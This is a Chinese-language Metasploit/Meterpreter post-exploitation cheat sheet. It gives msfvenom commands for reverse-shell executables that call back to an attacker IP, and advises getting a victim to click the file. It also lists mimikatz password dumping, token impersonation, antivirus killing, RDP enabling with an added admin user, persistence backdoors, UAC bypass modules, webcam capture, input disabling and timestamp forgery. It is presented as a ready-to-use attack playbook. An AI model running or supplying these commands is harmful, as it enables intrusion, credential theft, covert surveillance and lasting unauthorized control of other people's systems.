
# 获取Meterpreter会话

```
https://uknowsec.cn/posts/uncategorized/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8Bmeterpreter%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5.html
```

##  使用msfvenom生成payload

```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.100.82 lport=6565 -f exe -o /re.exe

msfvenom -p windows/x32/meterpreter_reverse_tcp lhost=192.168.100.82 lport=6565 -f exe -o /jojo_32.exe

msfvenom -p windows/meterpreter/reverse_tcp lhost=接受ip地址 lport=接收端口 -f exe -o rabbit.exe
```


```
 use exploit/multi/handler
```
```
set payload windows/x64/meterpreter_reverse_tcp 
```
``` 
set lhost 192.168.100.82  //设置接受payload的地址，我们这里设置MSF的地址
```
```
set lport 6565          // 设置接受的端口，这个自己自定义，只要不与其它端口冲突就可以
```
```
 run
```
然后获得会话

## 你只要想方设法让他点击到这个exe即可 接下来交给老爹!
 
将生成的exe文件或者其它类型的payload文件在目标上执行，就可以获得一个meterpreter会话，之后就可以使用msf开展后渗透测试的相关工作。

![](img/2.png)

## 可能会用到的常用代码整理

## load -l

查看所有可以使用的插件
```
espia
extapi
incognito
kiwi
lanattacks
mimikatz
peinjector
powershell
priv
python
sniffer       
stdapi
unhook
winpmem
```




### 文件上传
```
upload <file> <destination>
\\上传文件到Windows主机 注意：使用-r参数可以递归上传上传目录和文件
```
### 文件下载
```
download <file> <path to save>
 \\可以下载远程主机上的文件,
 
 如果我们需要递归下载整个目录包括子目录和文件，我们可以使用download -r命令
```
### 文件执行
```
在目标主机上执行exe文件
execute -f <path> [options]
```
### 获取权限
```
获取admin权限
getsystem
```
目标主机上执行exe文件
```
execute -H -i -f cmd.exe \\
  创建新进程cmd.exe，-H不可见，-i交互

  execute -f <path> [options]   \\在目标主机上执行exe文件
```
### 显示进程
```
ps
```
### 创建端口转发
```
portfwd add -l <端口号> -r <目标IP>
```
### 删除端口转发
```
portfwd delete -l <端口号> -p <端口号> -r <目标IP>   
```
  如果你想显示所有端口转发记录，你可以使用`portfwd list`命令，如果你想删除所有的记录，可以使用`portfwd flush`命令
<br>
<br>
### 文件搜索
```
search -f *.txt(文件名称)
```
### 获取用户ID
```
getuid
```
### 获取系统信息
```
sysinfo
```
### 模拟任意用户(token操作)

```
use incognito
list_tokens -u
impersonate_token “Machine\\user”
```
### 抓取密码和获取密码
```
load mimikatz              \\使用load mimikatz加载mimikatz模块
```
```
ssp       \\抓取密码
wdigest    \\用户储存在内存里的明文密码。
```
![](img/3.png)
''x




## 代码整理

### 操作文件系统

```
1.文件的基本操作
ls：列出当前路径下的所有文件和文件夹。

pwd 或 getwd：查看当前路径。

search：搜索文件，使用search -h查看帮助。

cat：查看文件内容，比如cat test.txt。

edit：编辑或者创建文件。和Linux系统的vm命令类似，同样适用于目标系统是windows的情况。

rm：删除文件。

cd：切换路径。

mkdir：创建文件夹。

rmdir：删除文件夹。

getlwd 或 lpwd：查看自己系统的当前路径。

lcd：切换自己当前系统的目录。

lls：显示自己当前系统的所有文件和文件夹。
```

### 系统其它操作

```
1.关闭防病毒软件
run killav

run post/windows/manage/killav

```
### 操作远程桌面

```
run post/windows/manage/enable_rdp      \\开启远程桌面

run post/windows/manage/enable_rdp username=test password=test       \\添加远程桌面的用户(同时也会将该用户添加到管理员组)
```

## 后门

Meterpreter的`shell运行在内存中`，目标重启就会失效，如果管理员给系统打上补丁，那么就没办法再次使用exploit获取权限，所以需要持久的后门对目标进行控制。

Msf提供了两种后门，一种是`metsvc(通过服务启动)`，一种是`persistence(支持多种方式启动)`。

### 1.metsvc

```
(1) 使用`run metsvc -h`查看帮助，一共有三个参数。

-A：安装后门后，自动启动exploit/multi/handler模块连接后门

-h：查看帮助

-r：删除后门
```

(2) 安装后门
```
命令：run metsvc
```
![](img/4.png)
命令运行成功后会在C:WindowsTEMP目录下新建随机名称的文件夹，里面生成3个文件（metsvc.dll、metsvc-server.exe、metsvc.exe）。

3)链接后门
```
use exploit/multi/handler
```
payload设置为windows/metsvc_bind_tcp
```
set payload windows/metsvc_bind_tcp
```
然后设置目标ip和绑定端口31337
```
set rhost 192.168.100.84
```
```
set lport 31337
```
运行程序
```
run
```
## 2.persistence

(1) 使用run persistence -h查看参数。

-A：安装后门后，自动启动exploit/multi/handler模块连接后门

-L：自启动脚本的路径，默认为%TEMP%

-P：需要使用的payload，默认为
```
windows/meterpreter/reverse_tcp
```
-S：作为一个服务在系统启动时运行（需要SYSTEM权限）

-T：要使用的备用可执行模板

-U：用户登陆时运行

-X：系统启动时运行

-i：后门每隔多少秒尝试连接服务端

-p：服务端监听的端口

-r：服务端ip

(2) 生成后门
```
命令：run persistence -X -i 10 -r 192.168.1.9 -p 4444

run persistence -X -i 10 -r 192.168.100.82 -p 4545 
```




(3) 连接后门

使用exploit/multi/handler模块，payload设置为
```
windows/meterpreter/reverse_tcp
```
![](img/5.png)
，同时设置好服务端监听ip和端口。



## 1.什么是UAC？

Microsoft的Windows Vista和Windows Server 2008操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。

## 2.UAC如何运行？

UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。

因为有的用户是没有管理员权限，没有管理员权限是运行不了哪些只能通过管理员权限才能操作的命令。比如修改注册表信息、创建用户、读取管理员账户密码、设置计划任务添加到开机启动项等操作。

最直接的提权命令：getsystem

绕过UAC防护机制的前提是我们首先通过explloit获得目标主机的meterprter。获得meterpreter会话1后，输入以下命令以检查是否是system权限。在这里我就不直接演示了，直接上命令，自己多练习练习即可，所话说熟能生巧。我们需要把获取到的session保存到后台，执行background



方法一:

`use exploit/windows/local/bypassuac ` //将通过进程注入使用可信任发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。
```
set session 1  //使用sessino 1

Exploit        //执行权限提升的攻击模式
```
执行完毕成功后，再次查询当前用户的权限就会提升到管理员权限。我这里已经是管理员权限了，所以会出现这样的提示。



方法二：Windows权限提升绕过UAC保护（内存注入）

此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。执行完毕以下命令，当前用户权限就会变为管理员权限。
```
use exploit/windows/local/bypassuac_fodhelper

set session 1

Exploit   
```
方法三：通过COM处理程序劫持  

首先介绍一下这个COM处理程序劫持，此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项。这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果cmd.exe访问受到限制，此模块将无法正常运行。

命令执行：

use exploit/windows/local/bypassuac_comhijack

set session 1

Exploit

方法四：通过Eventvwr注册表项 (特别麻烦，很难实现 --就是我没成功)

首先介绍一下这个模块，此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）。

use exploit/windows/local/bypassuac_eventvwr

set session 1

Exploit

以上的本地提权的模块大家可以本地去测试一下，除了这些某块还有其它的通过直接通过incognito中的add_localgroup_user提升、ms13-081、ms15-051、ms16-032、MS16-016、MS14-068、ms18_8120_win32k_privesc域权限提升等其它的权限提升方法。小白在内网渗透测试的过程中发现一些客户的服务器大多数为2003、2008服务器，很少2012、2016服务器。

内网渗透



------------------------------------------------------------

* # 以下代码谨慎使用 

## uictl开关键盘/鼠标

```
uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标
```
```
uictl disable mouse  #禁用鼠标
```
```
uictl disable keyboard  #禁用键盘
```


## webcam摄像头命令

```
webcam_list  #查看摄像头
```
```
webcam_snap   #通过摄像头拍照
```
```
webcam_stream   #通过摄像头开启视频
```
## 在目标系统播放目标文件

```
play /root/1.mp3
```
## 查看 == ls
```
 pwd 
```
## meterpreter load

加载模块

```
load -l             \\查看可以加载的所有模块
```


# 文件系统命令

## 基本文件系统命令

```
getwd 或者pwd # 查看当前工作目录  
```
```
ls
```
```
cd
```
```
search -f *pass*       # 搜索文件  -h查看帮助
```
```
cat c:\\lltest\\lltestpasswd.txt  # 查看文件内容
```
```
upload /tmp/hack.txt C:\\lltest  # 上传文件到目标机上
```
```
download c:\\lltest\\lltestpasswd.txt /tmp/ # 下载文件到本机上
```
```
edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件
```
```
rm C:\\lltest\\hack.txt
```
```
mkdir lltest2  #只能在当前目录下创建文件夹
```
```
rmdir lltest2  #只能删除当前目录下文件夹
```
```
getlwd   或者 lpwd   #操作攻击者主机 查看当前目录
```
```
lcd /tmp   #操作攻击者主机 切换目录
```

## timestomp伪造时间戳

```
timestomp C:// -h   #查看帮助
```
```
timestomp -v C://2.txt   #查看时间戳
```
```
timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
```












